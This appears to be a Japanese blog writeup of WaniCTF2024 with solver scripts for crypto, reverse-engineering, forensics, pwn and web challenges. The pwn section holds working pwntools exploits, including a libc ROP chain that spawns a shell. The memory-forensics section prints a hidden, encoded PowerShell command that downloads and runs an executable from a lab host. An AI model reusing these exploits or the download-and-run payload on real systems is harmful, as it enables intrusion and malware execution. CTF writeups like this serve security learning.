---
title: "WaniCTF2024"
date: 2024-06-25T18:50:04+09:00
draft: false
---

waniCTF に半日参加しました．
友達はいないのでソロです．

# writeup

## crypto

### beginners_rsa

```python
from Crypto.Util.number import *

p = getPrime(64)
q = getPrime(64)
r = getPrime(64)
s = getPrime(64)
a = getPrime(64)
n = p*q*r*s*a
e = 0x10001

FLAG = b'FLAG{This_is_a_fake_flag}'
m = bytes_to_long(FLAG)
enc = pow(m, e, n)
print(f'n = {n}')
print(f'e = {e}')
print(f'enc = {enc}')
```

Multi Prime RSA です．
与えられた n は簡単に素因数分解できるので，d が求まり，簡単に復号できます.
素因数分解はなんでもいいんですが今回は [Msieve](https://sourceforge.net/projects/msieve/) を使いました[(参考)](https://inaz2.hatenablog.com/entry/2016/01/09/032521).

```python
from Crypto.Util.number import inverse, long_to_bytes

n = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347
e = 0x10001
enc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265
p = 9953162929836910171
q = 11771834931016130837
r = 12109985960354612149
s = 13079524394617385153
a = 17129880600534041513

phi_n = (p - 1) * (q - 1) * (r - 1) * (s - 1) * (a - 1)
d = inverse(e, phi_n)
m = pow(enc, d, n)
FLAG = long_to_bytes(m)
print(FLAG)
```

### beginners_aes

```python
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from os import urandom
import hashlib

key = b'the_enc_key_is_'
iv = b'my_great_iv_is_'
key += urandom(1)
iv += urandom(1)

cipher = AES.new(key, AES.MODE_CBC, iv)
FLAG = b'FLAG{This_is_a_dummy_flag}'
flag_hash = hashlib.sha256(FLAG).hexdigest()

msg = pad(FLAG, 16)
enc = cipher.encrypt(msg)

print(f'enc = {enc}') # bytes object
print(f'flag_hash = {flag_hash}') # str object
print(key)
```

鍵と初期ベクトルの最後 1 byte だけがランダムなのでここを総当たりすればいい

```python
from Crypto.Util.Padding import unpad, pad
from Crypto.Cipher import AES
import hashlib

# Known parts of the key and IV
known_key_part = b'the_enc_key_is_'
known_iv_part = b'my_great_iv_is_'

def decrypt(key, iv, msg):
   cipher = AES.new(key, AES.MODE_CBC, iv)
   decrypted = unpad(cipher.decrypt(msg), 16)
   return decrypted

enc = b'\x16\x97,\xa7\xfb_\xf3\x15.\x87jKRaF&"\xb6\xc4x\xf4.K\xd77j\xe5MLI_y\xd96\xf1$\xc5\xa3\x03\x990Q^\xc0\x17M2\x18'
flag_hash = 0x6a96111d69e015a07e96dcd141d31e7fc81c4420dbbef75aef5201809093210e

for i in range(256):
        for j in range(256):
                key = known_key_part + bytes([i])
                iv = known_iv_part + bytes([j])
                #enc = pad(enc, 16)
                try:
                        flag_hash_tmp = hashlib.sha256(decrypt(key, iv, enc)).hexdigest()
                        if(flag_hash == flag_hash_tmp):
                                print(key, iv)
                                print(decrypt(key, iv, enc))
                                print("OK")
                                break
                        else:
                                print("No")
                                print(i, j)
                except Exception as e:
                        continue
```

### replacement

```python
from secret import cal
import hashlib

enc = []
for char in cal:
    x = ord(char)
    x = hashlib.md5(str(x).encode()).hexdigest()
    enc.append(int(x, 16))
        
with open('my_diary_11_8_Wednesday.txt', 'w') as f:
    f.write(str(enc))
```

大量のハッシュ値がありますが，日記から読み込んだ一文字ずつをハッシュしているだけなので総当たりで解けます

```python
import string
for i in string.printable:
    x = ord(i)
    x = hashlib.md5(str(x).encode()).hexdigest()
    for j in range(len(tmp)):
        try:
                if(str(x)==str(hex(tmp[j]))[2:]):
                        print("OK")
                        tmp[j] = i
        except:
                continue
    
print("".join(tmp))  
```

### Easy culc

```python
import os
import random
from hashlib import md5

from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes, getPrime

FLAG = os.getenvb(b"FLAG", b"FAKE{THIS_IS_NOT_THE_FLAG!!!!!!}")


def encrypt(m: bytes, key: int) -> bytes:
    iv = os.urandom(16)
    key = long_to_bytes(key)
    key = md5(key).digest()
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    return iv + cipher.encrypt(m)


def f(s, p):
    u = 0
    for i in range(p):
        u += p - i
        u *= s
        u %= p

    return u


p = getPrime(1024)
s = random.randint(1, p - 1)

A = f(s, p)
ciphertext = encrypt(FLAG, s).hex()


print(f"{p = }")
print(f"{A = }")
print(f"{ciphertext = }")
```

式変形は書くのが大変なので書かないが，```f``` の中身を書き下すと以下のようになる．

f(s,p) = A = sum(i*s^i) i=1~p

このうえで，等比数列の部分和を求めればよいので Wolfram なりを使っていい感じに式変形してあげる．
フェルマーの小定理より s^(p-1) mod p = 1, s^p mod p = s なので s が A であらわせるようになる．
で，これを使えば AES 復号ができる

### dance

ログイン操作と暗号化操作がある．

``` python
def Encrypt():
    global isLogged
    global current_user
    if not isLogged:
        print('You need to login first')
        return
    token = d[current_user]
    sha256 = hashlib.sha256()
    sha256.update(token.encode())
    key = sha256.hexdigest()[:32]
    nonce = token[:12]
    cipher = MyCipher(key.encode(), nonce.encode())
    plaintext = input('Enter plaintext: ')
    ciphertext = cipher.encrypt(plaintext.encode())
    print('username:', current_user)
    print('Ciphertext:', ciphertext.hex())
    return
```

見てみると token を key と nonce として encrypt に渡している．
で，この token は何かというと register 時の処理で生成される．
で，この register 時の処理は登録時の分，秒，ユーザーネームを組み合わせて sha256 をしている．

```python
def Register():
    global d
    username = input('Enter username: ')
    if username in d:
        print('Username already exists')
        return
    dt_now = datetime.datetime.now()
    minutes = dt_now.minute
    sec = dt_now.second
    data1 = f'user: {username}, {minutes}:{sec}'
    data2 = f'{username}'+str(random.randint(0, 10))
    d[username] = make_token(data1, data2)
    print('Registered successfully!')
    print('Your token is:', d[username])
    return

def make_token(data1: str, data2: str):
    sha256 = hashlib.sha256()
    sha256.update(data1.encode())
    right = sha256.hexdigest()[:20]
    sha256.update(data2.encode())
    left = sha256.hexdigest()[:12]
    token = left + right
    return token
```

実際に encrypt しているのは以下

```python
class MyCipher:
    def __init__(self, key: bytes, nonce: bytes):
        self.key = key
        self.nonce = nonce
        self.counter = 1
        self.state = List[F2_32]

...

def encrypt(self, plaintext: bytes) -> bytes:
        encrypted_message = bytearray(0)

        for i in range(len(plaintext)//64):
            key_stream = self.__get_key_stream(self.key, self.counter + i, self.nonce)
            encrypted_message += self.__xor(plaintext[i*64:(i+1)*64], key_stream)

        if len(plaintext) % 64 != 0:
            key_stream = self.__get_key_stream(self.key, self.counter + len(plaintext)//64, self.nonce)
            encrypted_message += self.__xor(plaintext[(len(plaintext)//64)*64:], key_stream[:len(plaintext) % 64])

        return bytes(encrypted_message)
```

で，じゃあ復号どうするのか，という話になるが，暗号化の時点で xor なので同じ計算をすればいい．
solver は以下

```python
from mycipher import MyCipher
import hashlib
import datetime
import random

def make_token(m, s, r):
    data1 = f'user: gureisya, {m}:{s}'
    data2 = f'gureisya'+str(r)
    sha256 = hashlib.sha256()
    sha256.update(data1.encode())
    right = sha256.hexdigest()[:20]
    sha256.update(data2.encode())
    left = sha256.hexdigest()[:12]
    token = left + right
    return token
    
def Encrypt(m, s, r):
    token = make_token(m, s, r)
    sha256 = hashlib.sha256()
    sha256.update(token.encode())
    key = sha256.hexdigest()[:32]
    nonce = token[:12]
    cipher = MyCipher(key.encode(), nonce.encode())
    plaintext = '061ff06da6fbf8efcd2ca0c1d3b236aede3f5d4b6e8ea24179'
    ciphertext = cipher.encrypt(bytes.fromhex(plaintext))
    # print(ciphertext)
    return str(ciphertext)

def main():
    for i in range(60):
        for j in range(60):
            for k in range(11):
                dec = Encrypt(i, j, k)
                if(dec[2:6]) == 'FLAG':
                  print("OK")
                  print(dec)
                

if __name__ == '__main__':
    main()
```

## rev

### lambda

lambda で連結された python ファイルが渡されます．
吐きそうになりながらコードを手で復元します．
そういうツールあるんかな

```python
encoded_string = '16_10_13_x_6t_4_1o_9_1j_7_9_1j_1o_3_6_c_1o_6r'
segments = encoded_string.split('_')
decoded_numbers = [int(seg, 36) + 10 for seg in segments]

xored_chars = [chr(num) for num in decoded_numbers]
subtracted_chars = [chr(ord(c) ^ 123) for c in xored_chars]
added_chars = [chr(ord(c) + 3) for c in subtracted_chars]
final_chars = [chr(ord(c) - 12) for c in added_chars]

flag = ''.join(final_chars)
print(flag)
```

### home

ptrace が検知されてしまうので動的解析ができません．
なので gdb でデバッガ検知をスルーします

```shell
gdb-peda$ b *0x5555555559f3
gdb-peda$ b *0x5555555558e7
r
set $rax=0
c
stack 50
0200| 0x7fffffffd898 --> 0x890000007b 
0208| 0x7fffffffd8a0 --> 0x780000007d ('}')
0216| 0x7fffffffd8a8 --> 0x710000004e ('N')
0224| 0x7fffffffd8b0 --> 0x9700000067 
0232| 0x7fffffffd8b8 --> 0x6b00000072 ('r')
0240| 0x7fffffffd8c0 --> 0x8300000089 
0248| 0x7fffffffd8c8 --> 0x9000000073 
0256| 0x7fffffffd8d0 --> 0x8600000074 
0264| 0x7fffffffd8d8 --> 0x8100000068 
0272| 0x7fffffffd8e0 --> 0x5d00000081 
0280| 0x7fffffffd8e8 --> 0x2b000000a7 
0288| 0x7fffffffd8f0 ("FLAG{How_did_you_get_here_4VKzTLibQmPaBZY4}")
0296| 0x7fffffffd8f8 ("_did_you_get_here_4VKzTLibQmPaBZY4}")
0304| 0x7fffffffd900 ("_get_here_4VKzTLibQmPaBZY4}")
0312| 0x7fffffffd908 ("e_4VKzTLibQmPaBZY4}")
0320| 0x7fffffffd910 ("ibQmPaBZY4}")
0328| 0x7fffffffd918 --> 0xa32a1da007d3459 
0336| 0x7fffffffd920 --> 0x7ffff7fcb7b0 --> 0xe001100000243 
0344| 0x7fffffffd928 --> 0x7fffffffde88 --> 0x7fffffffe1f9 ("/home/kali/wani/rev-home/Service/chal_home")
0352| 0x7fffffffd930 --> 0x0 
0360| 0x7fffffffd938 --> 0x7fffffffde98 --> 0x7fffffffe224 ("COLORFGBG=15;0")
0368| 0x7fffffffd940 --> 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x555555554000 --> 0x10102464c457f 
0376| 0x7fffffffd948 --> 0x0 
0384| 0x7fffffffd950 --> 0x7fffffffdd70 --> 0x1 
0392| 0x7fffffffd958 --> 0x555555555a16 (<main+159>:    jmp    0x555555555a39 <main+194>)
```

### thread

```pthread_mutex_xxx``` を使ったスレッドプログラミングです．

```C
undefined8 FUN_00101289(int *param_1)

{
  int iVar1;
  int iVar2;
  int local_14;
  
  iVar1 = *param_1;
  local_14 = 0;
  while (local_14 < 3) {
    pthread_mutex_lock((pthread_mutex_t *)&DAT_00104100);
    iVar2 = (iVar1 + *(int *)(&DAT_00104200 + (long)iVar1 * 4)) % 3;
    if (iVar2 == 0) {
      *(int *)(&DAT_00104140 + (long)iVar1 * 4) = *(int *)(&DAT_00104140 + (long)iVar1 * 4) * 3;
    }
    if (iVar2 == 1) {
      *(int *)(&DAT_00104140 + (long)iVar1 * 4) = *(int *)(&DAT_00104140 + (long)iVar1 * 4) + 5;
    }
    if (iVar2 == 2) {
      *(uint *)(&DAT_00104140 + (long)iVar1 * 4) = *(uint *)(&DAT_00104140 + (long)iVar1 * 4) ^ 0x7f
      ;
    }
    *(int *)(&DAT_00104200 + (long)iVar1 * 4) = *(int *)(&DAT_00104200 + (long)iVar1 * 4) + 1;
    local_14 = *(int *)(&DAT_00104200 + (long)iVar1 * 4);
    pthread_mutex_unlock((pthread_mutex_t *)&DAT_00104100);
  }
  return 0;
}
```

重要なのはここで，インデックスに応じて計算内容が変わっている．

```python
base = [0x00a8, 0x008a, 0x00bf, 0x00a5,
	0x02fd, 0x0059, 0x00de, 0x0024,
	0x0065, 0x010f, 0x00de, 0x0023,
	0x015d, 0x0042, 0x002c, 0x00de,
	0x0009, 0x0065, 0x00de, 0x0051,
	0x00ef, 0x013f, 0x0024, 0x0053,
	0x015d, 0x0048, 0x0053, 0x00de,
	0x0009, 0x0053, 0x014b, 0x0024,
	0x0065, 0x00de, 0x0036, 0x0053,
	0x015d, 0x0012, 0x004a, 0x0124,
	0x003f, 0x005f, 0x014e, 0x00d5,
	0x000b]

for i in range(len(base)):
    if i % 3 == 0:
        print(chr((((base[i] ^ 0x7f) - 5) // 3)), end="")
    if i % 3 == 1:
        print(chr(((base[i] // 3) ^0x7f) - 5),end="")
    if i % 3 == 2:
        print(chr((((base[i] -5) // 3) ^ 0x7f)),end="")
```

ハードコードされているところを見ればいいんだが，サラ見しかしてなかったせいで ```while()``` 文を見落としていた．

### gates

まず main は以下

```C
undefined8 FUN_00101080(void)

{
  int iVar1;
  char *pcVar2;
  char *pcVar3;
  undefined1 *puVar4;
  undefined1 *puVar5;
  
  puVar4 = &DAT_0010404c;
  do {
    puVar5 = puVar4 + 0x10;
    iVar1 = getc(stdin);
    *puVar4 = 1;
    puVar4[1] = (char)iVar1;
    puVar4 = puVar5;
  } while (puVar5 != &DAT_0010424c);
  iVar1 = 0x100;
  do {
    FUN_00101220();
    iVar1 = iVar1 + -1;
  } while (iVar1 != 0);
  pcVar2 = &DAT_00104e4d;
  pcVar3 = &DAT_00104020;
  do {
    if (*pcVar2 != *pcVar3) {
      puts("Wrong!");
      return 1;
    }
    pcVar2 = pcVar2 + 0x10;
    pcVar3 = pcVar3 + 1;
  } while (pcVar2 != &DAT_0010504d);
  puts("Correct!");
  return 0;
}
```

標準入力からの文字列を 32 文字分 ((DAT_0010424c - DAT_0010404c) / 0x10 = 0x20) 保存する．
そのあと，do~while を 100 回繰り返すが，その中に FUN_00101220 を含む．
最後に，&DAT_00104e4d の値と &DAT_00104020; の値を比較して合致していれば correct となる．

というわけで angr で解いてみると以下のようになる．

今回は以下のように環境を構築する

``` shell
pipenv install
pipenv shell
pip install angr
```

```python
import angr
proj = angr.Project("./gates", auto_load_libs=False)

@project.hook(0x401124)
def print_flag(state):
    print("FLAG", state.posix.dumps(0))
    project.terminate_execution()

project.execute()
```

## forensics

### tiny_usb

.iso が渡されます．
中身を見ると png が入ってるので見ると flag が取れます

### Surveillance_of_sus

.bin のキャッシュファイルが渡されます．
[bmc-tools](https://github.com/ANSSI-FR/bmc-tools) なるものを使って復元すると windows 画面っぽいものがたくさん手に入ります．
この画像をくっつけると flag が取れます

### codebreaker

でっかいバツがかかれた QR コードが渡されます．
そのままでは当然読み取れないので手で復元します．
最初は隅っこと右下のキーを描きなおします．
そのあとは，ナナメの線は消える，みたいな感じで消していくといつか読み取れるようになります．

GIMP を使いましたが，コントラストをぐっと上げると判別しやすくなります．

### I_wanna_be_a_streamer

wireshark でストリームをキャッチしたファイルが渡されます．
そのままだと h264 をデコードできないので，[プラグイン](https://github.com/volvet/h264extractor)を入れます．
[ここらへん](https://stackoverflow.com/questions/26164442/decoding-rtp-payload-as-h264-using-wireshark)を参考にしてインストールしました．
デコードすると動画が手に入ります．
動画の中に flag が書いてあります．

### tiny_10px

10 px * 10 px の jpg が渡されます．
jpg のフォーマットを見ると[SOFヘッダなるものが見つかりますが，](https://qiita.com/spc_ehara/items/87d383a59a37a2c82531#sofstart-of-frame----%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%83%98%E3%83%83%E3%83%80)ここで画像サイズが参照されます．
ここを hexeditor なりで変更してあげれば画像が復元できます．

### mem_search

```shell
python3 volatility3/vol.py -f chal_mem_search.DUMP windows.filescan | grep Mikka
```

```shell
...
0xcd88cebc26c0  \Users\Mikka\Desktop\read_this_as_admin.lnknload        216
...
```

明らかに怪しいので，これに関連したものを見る

```shell
└─$ python3 volatility3/vol.py -f chal_mem_search.DUMP windows.filescan | grep admin
0xcd88cdd78a30.0\Windows\System32\srchadmin.dll 216
0xcd88cebae1c0  \Users\Mikka\Downloads\read_this_as_admin.download      216
0xcd88cebc26c0  \Users\Mikka\Desktop\read_this_as_admin.lnknload        216
```

```shell
┌──(kali㉿kali)-[~/wani]
└─$ cat file.0xcd88cebc26c0.0xcd88ced4e5f0.DataSectionObject.read_this_as_admin.lnknload 
-- sniff--

-window hidden -noni -enc JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA=

-- sniff --
```

これを cyberchef で base64 + decode text(UTF16) デコードすると以下のようになります

```shell
$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
```

これをさらに base64 でデコードすると flag が出てきます

## pwn

### nc

接続すればいいです

### do_not_rewite

配列は 3 要素しかないのに，ループは 4 周するので配列外アクセスが可能になる．
これを使って ROP しようと思いつくが，canary があるのでそのままだと stack smash detected となる．

ghidra で for ループは *main + 0x1AA の場所にあることがわかるので，gdb で止めてみる．
canary と rbp が見えるが，4 つめまでのループを回すと確かに canary が侵食されていることが分かる．
しかし，canary は amount of grams にしか対応していないので，ここを書き換えなければいい．

修飾子である ```%lf``` は ```+``` を入力すれば値を書き換えずに scanf が終了する．

最後に，win 関数は system() を使っているが，system() はスタックが 16 bytes アラインメントされていなければならないことに注意する．

なので，以下のような solver でよい

```python
from pwn import *
context(arch='amd64')

s = process('./chall')

s.recvuntil(b"hint: show_flag = 0x")
win = int(s.recvline()[:-1].decode(), 16)
print("win addr is: " + hex(win))

for _ in range(3):
    s.recvuntil(': ')
    s.sendline(b'anpan')
    s.recvuntil(': ')
    s.sendline(b'123')
    s.recvuntil(': ')
    s.sendline(b'000')
print("normal OK")
    
s.sendline(pack(win + 5))
s.sendline(b'+')
s.sendline(b'+')
s.interactive()
```

### do_not_rewite2

配列外のアクセスは変わっていないが，今回は win 関数の代わりに printf() が渡されている．

```python
from pwn import *
context.arch = "amd64"

path = "./chall"
so = "./libc.so.6"

p = process(path)
libc = ELF(so)

p.recvuntil(b"hint: printf = ")
add_printf = int(p.recvline(), 16)
print(f"{add_printf = :08x}")

for _ in range(3):
    p.sendlineafter(b": ", b"anpan")
    p.sendlineafter(b": ", b"1234")
    p.sendlineafter(b": ", b"1234")

libc.address = add_printf - libc.symbols.printf
print(f"{libc.address = :08x}")

rop = ROP(libc)
rop.rsi = 0
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.rax = constants.SYS_execve
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendlineafter(b": ", rop.chain())
p.sendlineafter(b": ", b"a")
p.sendlineafter(b": ", b"b")

p.interactive()
```

## Web

### Bad_Worker

開発者ツールでネットワークを見ると FLAG.txt をダウンロードしているっぽいので直接 FLAG.txt を持ってきます

```shell
curl https://[xxx].wanictf.org/FLAG.txt
```

### pow

ごく簡単に言うとすごく重い計算( 10 回 sha256 を計算して先頭 48 bytes が全て 0 になる数字を 1000000 個見つける)が完了するまで終わらないページが開いている．
["2862152"] で一個目が見つかるので相当大変

でも ["2862152"] を複数回送ってもカウントは増える．
そこで，["2862152"] を 1000000 回送るようにすればいい.
